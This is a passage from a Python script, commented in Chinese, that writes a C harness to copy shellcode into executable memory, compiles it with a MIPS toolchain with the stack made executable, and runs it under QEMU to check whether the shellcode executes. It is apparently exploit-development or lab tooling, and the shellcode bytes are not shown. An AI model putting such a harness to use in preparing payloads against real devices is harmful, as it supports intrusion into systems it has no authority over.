                                  PROT_READ | PROT_WRITE | PROT_EXEC,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

            if (exec_mem == MAP_FAILED) {{
                perror("mmap");
                return 1;
            }}

            memcpy(exec_mem, shellcode, sizeof(shellcode));
            printf("Executing shellcode at address: %p\\\n", exec_mem);

            void (*func)() = (void(*)())exec_mem;
            func();

            munmap(exec_mem, sizeof(shellcode));
            return 0;
        }}
        """

        qemu_path = CONFIG['QEMU_PATH']
        c_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_verify_shellcode.c")
        elf_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_verify_shellcode")
        # 2. 写入文件
        try:
            with open(c_file_path, "w") as f:
                f.write(final_c_code)
            print(f"[+] 生成C测试文件: '{c_file_path}'")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{c_file_path}' 失败: {e}")
            return
        # 3. 编译
        subprocess.run([
            f"{CONFIG['MIPS_TOOLCHAIN_PATH']}gcc", "-z", "execstack", "-static", "-g", "-o", elf_file_path,
            c_file_path], capture_output=True, text=True)

        print(f"[+] 测试程序编译完成: '{elf_file_path}'")
        # 4. 执行
        result = subprocess.run([qemu_path, elf_file_path], capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if result.returncode == 0:
            print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
        else:
            print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")
